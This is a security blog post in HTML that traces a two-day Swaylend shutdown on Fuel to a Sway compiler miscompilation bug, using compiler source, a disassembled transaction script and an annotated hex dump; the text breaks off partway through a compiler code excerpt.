<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="The story begins with an issue reported by our team during the Fuel Attackathon, an audit competition held on Immunefi, along with 20+ other Sway miscompilation bugs. These bugs, however, were not pri">
<meta property="og:type" content="article">
<meta property="og:title" content="A Preventable Two-Day Shutdown Caused by a Compiler Bug">
<meta property="og:url" content="http://example.com/2024/11/07/Swaylend_shutdown/index.html">
<meta property="og:site_name" content="Anatomist">
<meta property="og:description" content="The story begins with an issue reported by our team during the Fuel Attackathon, an audit competition held on Immunefi, along with 20+ other Sway miscompilation bugs. These bugs, however, were not pri">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2024/11/07/Swaylend_shutdown/transaction.png">
<meta property="og:image" content="http://example.com/2024/11/07/Swaylend_shutdown/transaction_advanced.png">
<meta property="article:published_time" content="2024-11-07T00:00:00.000Z">
<meta property="article:modified_time" content="2024-11-07T00:00:00.000Z">
<meta property="article:author" content="Anatomist">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/11/07/Swaylend_shutdown/transaction.png">

<link rel="canonical" href="http://example.com/2024/11/07/Swaylend_shutdown/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>A Preventable Two-Day Shutdown Caused by a Compiler Bug | Anatomist</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-W297MFDESE"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-W297MFDESE');
      }
    </script>






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Anatomist</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/07/Swaylend_shutdown/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Anatomist">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Anatomist">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          A Preventable Two-Day Shutdown Caused by a Compiler Bug
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-07 00:00:00" itemprop="dateCreated datePublished" datetime="2024-11-07T00:00:00+00:00">2024-11-07</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="Long-Story-Short"><a href="#Long-Story-Short" class="headerlink" title="Long Story Short"></a>Long Story Short</h2><p>Compiler vulnerabilities tend to be overlooked because compiler developers may perceive them as either having little to no consequences or being easily avoidable in the final DApps. However, DApps developers, unaware of these compiler bugs, are likely to fail in detecting the unintended effects those bugs have on their products. The information gap between the two groups can lead to severe incidents, resulting in significant financial loss. Notable examples include <a target="_blank" rel="noopener" href="https://hackmd.io/@vyperlang/HJUgNMhs2">the Vyper reentrancy bug</a>, which led to <strong>the loss of over $26 million</strong> in smart contracts.</p>
<p>In this article, we will dive into the details of <a target="_blank" rel="noopener" href="https://x.com/swaylend/status/1853554438772085138">the Fuel-Swaylend buffer overflow vulnerability</a>, which led to an incident where the contract was halted for 2 days. The story begins with an issue reported by our team during the Fuel Attackathon, an audit competition held on Immunefi, along with 20+ other Sway miscompilation bugs. These bugs, however, were not prioritized for immediate fixing.</p>
<p>Months later, shortly after fuel launched its mainnet, we noticed <a target="_blank" rel="noopener" href="https://app.fuel.network/tx/0x07a083e3d2dca53e66cb34b2d8fea29722ea5709fae12cd0fe1bb72c2cd640e8/simple">Swaylend transactions failing with error code 123</a>. This error, which rarely occurs under normal operation, coincided with the impact of one of the compiler bugs we had reported during the Attackathon. Our further investigation confirmed that the bug was indeed the root cause. Consequently, Swaylend was paused until the compiler bug was fixed and a <a target="_blank" rel="noopener" href="https://app.fuel.network/tx/0xe17ffa77accd1b9571a2302672154fc10c59f6f2d52bb0f0a1138f2c071629d1/simple">newly recompiled version</a> was deployed. However, a <strong>2-day shutdown</strong> had already occurred.</p>
<p>While the bugs we reported were initially not considered high priority, the incident highlighted their potential severity, prompting further attention to these issues. Some of the bugs still remain unresolved, pointing to the need for ongoing vigilance in addressing compiler-related vulnerabilities.</p>
<p>Now, let’s explore the technical details in more depth, shall we? :)</p>
<h2 id="The-Incident"><a href="#The-Incident" class="headerlink" title="The Incident"></a>The Incident</h2><h3 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h3><p>While casually browsing through fuel transactions, we noticed <a target="_blank" rel="noopener" href="https://app.fuel.network/tx/0x07a083e3d2dca53e66cb34b2d8fea29722ea5709fae12cd0fe1bb72c2cd640e8/simple">certain Swaylend transactions were failing with error code 123</a>. This was alarming, as code 123 is reserved for <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/431eab101250e713b38db9cb8185b6b8a92d2fdf/sway-core/src/semantic_analysis/ast_node/declaration/auto_impl.rs#L700">mismatched selector reverts</a>—in other words, calling an unknown function of an external contract.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pub</span>(<span class="keyword">crate</span>) <span class="keyword">const</span> MISMATCHED_SELECTOR_REVERT_CODE: <span class="type">u32</span> = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>&gt; EncodingAutoImplContext&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    <span class="symbol">&#x27;a</span>: <span class="symbol">&#x27;b</span>,</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="title function_ invoke__">pub</span>(<span class="keyword">crate</span>) <span class="keyword">fn</span> <span class="title function_">generate_contract_entry</span>(</span><br><span class="line">        &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">        engines: &amp;Engines,</span><br><span class="line">        program_id: <span class="type">Option</span>&lt;ProgramId&gt;,</span><br><span class="line">        contract_fns: &amp;[DeclId&lt;TyFunctionDecl&gt;],</span><br><span class="line">        fallback_fn: <span class="type">Option</span>&lt;DeclId&lt;TyFunctionDecl&gt;&gt;,</span><br><span class="line">        handler: &amp;Handler,</span><br><span class="line">    ) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TyAstNode, ErrorEmitted&gt; &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">fallback</span> = <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(fallback_fn) = fallback_fn &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// as the old encoding does</span></span><br><span class="line">            <span class="built_in">format!</span>(<span class="string">&quot;__revert(&#123;&#125;);&quot;</span>, MISMATCHED_SELECTOR_REVERT_CODE)</span><br><span class="line">        &#125;;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Such errors rarely occur during normal operation. Moreover, this coincided with an observable artifact of one of the compiler bugs we reported during the Fuel Attackathon, leading us to suspect that it might have a similar root cause. We will walk you through our journey of investigating the issue, as well as highlight key takeaways.</p>
<h3 id="Investigation"><a href="#Investigation" class="headerlink" title="Investigation"></a>Investigation</h3><img src="/2024/11/07/Swaylend_shutdown/transaction.png" class="" title="SystemOverview">

<p>Starting with the failing transaction, we first need to gather information on what happened. The Operations section of the transaction provides a simple overview of the events. It shows that the execution begins with a script calling the Sway proxy contract <code>(0x657ab45a6eb98a4893a99fd104347179151e8b3828fd8f2a108cc09770d1ebae)</code>, which then calls the Pyth oracle contract <code>(0x1c86fdd9e0e7bc0d2ae1bf6817ef4834ffa7247655701ee1b031b52a24c523da)</code> before reverting. While this is helpful, it doesn’t reveal which function of the Sway contract was called. To determine that, we need to examine the script.</p>
<img src="/2024/11/07/Swaylend_shutdown/transaction_advanced.png" class="" title="SystemOverview">

<p>The script, along with the script data, can be obtained from the advanced transaction view. The script itself is quite short, and when plugged into the disassembler, the logic is also fairly straightforward: it simply calls a contract with parameters from the script data.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">byte   op                                                                                 notes  </span><br><span class="line">0      MOVI &#123; dst: 0x10, val: 10432 &#125;                                                     point reg 0x10 to param in script data</span><br><span class="line">4      MOVI &#123; dst: 0x11, val: 10392 &#125;                                                     load amount of coins to forward into reg 0x11 from scriptdata</span><br><span class="line">8      LW &#123; dst: 0x11, addr: 0x11, offset: 0 &#125;                                            </span><br><span class="line">12     MOVI &#123; dst: 0x12, val: 10400 &#125;                                                     point reg 0x12 to asset_id in script data          </span><br><span class="line">16     CALL &#123; target_struct: 0x10, fwd_coins: 0x11, asset_id_addr: 0x12, fwd_gas: 0xa &#125;            </span><br><span class="line">20     RET &#123; value: 0x1 &#125;</span><br></pre></td></tr></table></figure>

<p>Let’s examine the script data to identify which functions are called. Looking up the <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/431eab101250e713b38db9cb8185b6b8a92d2fdf/sway-lib-core/src/codec.sw#L5026">code library</a>, we see <code>target_struct</code> (or <code>params</code>) is the serialization of 3 fields: <code>contract_id</code>, <code>method_name</code> and other function arguments. </p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">contract_call</span>&lt;T, TArgs&gt;(</span><br><span class="line">    contract_id: b256,</span><br><span class="line">    method_name: <span class="type">str</span>,</span><br><span class="line">    args: TArgs,</span><br><span class="line">    coins: <span class="type">u64</span>,</span><br><span class="line">    asset_id: b256,</span><br><span class="line">    gas: <span class="type">u64</span>,</span><br><span class="line">) <span class="punctuation">-&gt;</span> T</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    T: AbiDecode,</span><br><span class="line">    TArgs: AbiEncode,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">first_parameter</span> = <span class="title function_ invoke__">encode</span>(method_name);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">second_parameter</span> = <span class="title function_ invoke__">encode</span>(args);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">params</span> = <span class="title function_ invoke__">encode</span>((</span><br><span class="line">        contract_id,</span><br><span class="line">        <span class="title function_ invoke__">asm</span>(a: first_parameter.<span class="title function_ invoke__">ptr</span>()) &#123;</span><br><span class="line">            a: <span class="type">u64</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_ invoke__">asm</span>(a: second_parameter.<span class="title function_ invoke__">ptr</span>()) &#123;</span><br><span class="line">            a: <span class="type">u64</span></span><br><span class="line">        &#125;,</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    __contract_call(params.<span class="title function_ invoke__">ptr</span>(), coins, asset_id, gas);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ptr</span> = <span class="title function_ invoke__">asm</span>() &#123;</span><br><span class="line">        ret: raw_ptr</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">len</span> = <span class="title function_ invoke__">asm</span>() &#123;</span><br><span class="line">        retl: <span class="type">u64</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span> = BufferReader::<span class="title function_ invoke__">from_parts</span>(ptr, len);</span><br><span class="line">    T::<span class="title function_ invoke__">abi_decode</span>(buffer)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Cross-referencing it with the script data, we find that the <code>contract_id</code> is <code>0x657ab45a6eb98a4893a99fd104347179151e8b3828fd8f2a108cc09770d1ebae</code>, which matches the call we observed earlier. The method pointer points to the address <code>0x28f0</code> which holds the string <code>withdraw_collateral</code> with its length prepended. From the Swaylend contract, we find the <a target="_blank" rel="noopener" href="https://github.com/Swaylend/swaylend-monorepo/blob/29bb334a2c39108c41af263a16ffb7be074a50f9/contracts/market/src/main.sw#L379">function signature</a> for <code>withdraw_collateral</code> is <code>fn withdraw_collateral(asset_id: AssetId, amount: u64, price_data_update: PriceDataUpdate)</code>. We then proceed to decode the arguments as <code>(AssetId, u64, PriceDataUpdate)</code>. The respective fields are annotated below (<a target="_blank" rel="noopener" href="https://github.com/Swaylend/swaylend-monorepo/blob/29bb334a2c39108c41af263a16ffb7be074a50f9/abis/market_abi/src/structs.sw#L173">type definitions</a>).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0x2890(10384) :                         00 00 00 00 00 00 00 07 </span><br><span class="line">0x28a0(10400) : f8 f8 b6 28 3d 7f a5 b6 72 b5 30 cb b8 4f cc cb </span><br><span class="line">0x28b0(10416) : 4f f8 dc 40 f8 17 6e f4 54 4d db 1f 19 52 ad 07 </span><br><span class="line">0x28c0(10432) : 65 7a b4 5a 6e b9 8a 48 93 a9 9f d1 04 34 71 79  &lt;- call contract_id (start of encoded params structure)</span><br><span class="line">0x28d0(10448) : 15 1e 8b 38 28 fd 8f 2a 10 8c c0 97 70 d1 eb ae </span><br><span class="line">0x28e0(10464) : 00 00 00 00 00 00 28 f0 00 00 00 00 00 00 29 0b  &lt;- method ptr / args ptr</span><br><span class="line">0x28f0(10480) : 00 00 00 00 00 00 00 13                          &lt;- method name length</span><br><span class="line">                                        77 69 74 68 64 72 61 77  &lt;- method name (&quot;withdraw_collateral&quot;)</span><br><span class="line">0x2900(10496) : 5f 63 6f 6c 6c 61 74 65 72 61 6c </span><br><span class="line">                                                 f8 f8 b6 28 3d  &lt;- asset_id</span><br><span class="line">0x2910(10512) : 7f a5 b6 72 b5 30 cb b8 4f cc cb 4f f8 dc 40 f8 </span><br><span class="line">0x2920(10528) : 17 6e f4 54 4d db 1f 19 52 ad 07 </span><br><span class="line">                                                 00 00 00 00 00  &lt;- amount </span><br><span class="line">0x2930(10544) : 0f 42 40 </span><br><span class="line">                         00 00 00 00 00 00 00 07                 &lt;- price_data_update.update_fee = 7</span><br><span class="line">                                                 00 00 00 00 00  &lt;- price_data_update.publish_times = Vec&lt;u64&gt; with len 7</span><br><span class="line">0x2940(10560) : 00 00 07 40 00 00 00 67 24 e0 72 40 00 00 00 67</span><br><span class="line">0x2950(10576) : 24 e0 72 40 00 00 00 67 24 e0 72 40 00 00 00 67 </span><br><span class="line">0x2960(10592) : 24 e0 72 40 00 00 00 67 24 e0 72 40 00 00 00 67 </span><br><span class="line">0x2970(10608) : 24 e0 72 40 00 00 00 67 24 e0 72 </span><br><span class="line">                                                 00 00 00 00 00  &lt;- price_data_update.price_feed_ids = Vec&lt;PriceFeedId&gt; with len 7</span><br><span class="line">0x2980(10624) : 00 00 07</span><br><span class="line">                         ea a0 20 c6 1c c4 79 71 28 13 46 1c e1 </span><br><span class="line">0x2990(10640) : 53 89 4a 96 a6 c0 0b 21 ed 0c fc 27 98 d1 f9 a9 </span><br><span class="line">              :	               ...</span><br><span class="line">0x2a50(10832) : 52 b8 36 45 13 f6 ab 1c ca 5e d3 f1 f7 b5 44 89 </span><br><span class="line">0x2a60(10848) : 80 e7 84 </span><br><span class="line">                         00 00 00 00 00 00 00 01                 &lt;- price_data_update.update_data = Vec&lt;Bytes&gt; with len 1</span><br><span class="line">                                                 00 00 00 00 00  &lt;- price_data_update.update_data[0] = Bytes with len 0xba3</span><br><span class="line">0x2a70(10864) : 00 0b a3</span><br><span class="line">                         50 4e 41 55 01 00 00 00 03 b8 01 00 00 </span><br><span class="line">0x2a80(10880) : 00 04 0d 00 6a 9a 96 8b 05 c6 1c 4e 33 a6 ce d1 </span><br><span class="line">              :                       ...</span><br><span class="line">0x3600(13840) : 37 7e ea 97 08 ec dc 32 d3 1b 6b 0a 97 61 1e b5</span><br></pre></td></tr></table></figure>

<h3 id="Bug-Analysis"><a href="#Bug-Analysis" class="headerlink" title="Bug Analysis"></a>Bug Analysis</h3><p>Now we know <code>withdraw_collateral</code> is called and have the arguments, we are ready to dive into the code. We also know the actual failure occurs when calling the <code>pyth</code> contract, so let’s jump directly to <a target="_blank" rel="noopener" href="https://github.com/Swaylend/swaylend-monorepo/blob/29bb334a2c39108c41af263a16ffb7be074a50f9/contracts/market/src/main.sw#L1454">update_price_feed_if_necessary_internal</a> within <code>withdraw_collateral</code> where <code>pyth</code> contract is called. This is when things start getting interesting. The failure happens after calling <code>oracle.update_price_feeds_if_necessary</code>, but Swaylend uses the correct ABI, so what can possibly go wrong?</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Market</span> <span class="keyword">for</span> <span class="title class_">Contract</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">#[payable, storage(write)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">withdraw_collateral</span>(</span><br><span class="line">        asset_id: AssetId,</span><br><span class="line">        amount: <span class="type">u64</span>,</span><br><span class="line">        price_data_update: PriceDataUpdate,</span><br><span class="line">    ) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// Update price data</span></span><br><span class="line">        <span class="title function_ invoke__">update_price_feeds_if_necessary_internal</span>(price_data_update);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[payable, storage(read)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">update_price_feeds_if_necessary_internal</span>(price_data_update: PriceDataUpdate) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">contract_id</span> = storage.pyth_contract_id.<span class="title function_ invoke__">read</span>();</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">oracle</span> = <span class="title function_ invoke__">abi</span>(PythCore, contract_id.<span class="title function_ invoke__">bits</span>());</span><br><span class="line">    oracle</span><br><span class="line">        .update_price_feeds_if_necessary &#123;</span><br><span class="line">            asset_id: AssetId::<span class="title function_ invoke__">base</span>().<span class="title function_ invoke__">bits</span>(),</span><br><span class="line">            coins: price_data_update.update_fee,</span><br><span class="line">        &#125;(</span><br><span class="line">            price_data_update</span><br><span class="line">                .price_feed_ids,</span><br><span class="line">            price_data_update</span><br><span class="line">                .publish_times,</span><br><span class="line">            price_data_update</span><br><span class="line">                .update_data,</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This brings us to the compiler internals of Fuel. For contract ABI method calls, <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/431eab101250e713b38db9cb8185b6b8a92d2fdf/sway-core/src/semantic_analysis/ast_node/expression/typed_expression/method_application.rs#L461">Fuel automatically translates</a> them into the <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/431eab101250e713b38db9cb8185b6b8a92d2fdf/sway-lib-core/src/codec.sw#L5002"><code>contract_call</code> function</a> defined in the core library, which we’ve already shown above. So, we can mentally unpack <code>oracle.update_price_feeds_if_necessary</code> into an explicit call instead.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pub</span>(<span class="keyword">crate</span>) <span class="keyword">fn</span> <span class="title function_">type_check_method_application</span>(</span><br><span class="line">    handler: &amp;Handler,</span><br><span class="line">    <span class="keyword">mut</span> ctx: TypeCheckContext,</span><br><span class="line">    <span class="keyword">mut</span> method_name_binding: TypeBinding&lt;MethodName&gt;,</span><br><span class="line">    contract_call_params: <span class="type">Vec</span>&lt;StructExpressionField&gt;,</span><br><span class="line">    arguments: &amp;[Expression],</span><br><span class="line">    span: Span,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;ty::TyExpression, ErrorEmitted&gt; &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ctx.experimental.new_encoding &amp;&amp; method.is_contract_call &#123;</span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">call_contract_call</span>(</span><br><span class="line">            ctx: &amp;<span class="keyword">mut</span> TypeCheckContext,</span><br><span class="line">            original_span: Span,</span><br><span class="line">            return_type: TypeId,</span><br><span class="line">            method_name_expr: Expression,</span><br><span class="line">            _caller: Expression,</span><br><span class="line">            arguments: <span class="type">Vec</span>&lt;Expression&gt;,</span><br><span class="line">            typed_arguments: <span class="type">Vec</span>&lt;TypeId&gt;,</span><br><span class="line">            coins_expr: Expression,</span><br><span class="line">            asset_id_expr: Expression,</span><br><span class="line">            gas_expr: Expression,</span><br><span class="line">        ) <span class="punctuation">-&gt;</span> Expression &#123;</span><br><span class="line">            ...</span><br><span class="line">            Expression &#123;</span><br><span class="line">                kind: ExpressionKind::<span class="title function_ invoke__">FunctionApplication</span>(<span class="type">Box</span>::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                    FunctionApplicationExpression &#123;</span><br><span class="line">                        call_path_binding: TypeBinding &#123;</span><br><span class="line">                            inner: CallPath &#123;</span><br><span class="line">                                prefixes: <span class="built_in">vec!</span>[],</span><br><span class="line">                                suffix: Ident::<span class="title function_ invoke__">new_no_span</span>(<span class="string">&quot;contract_call&quot;</span>.<span class="title function_ 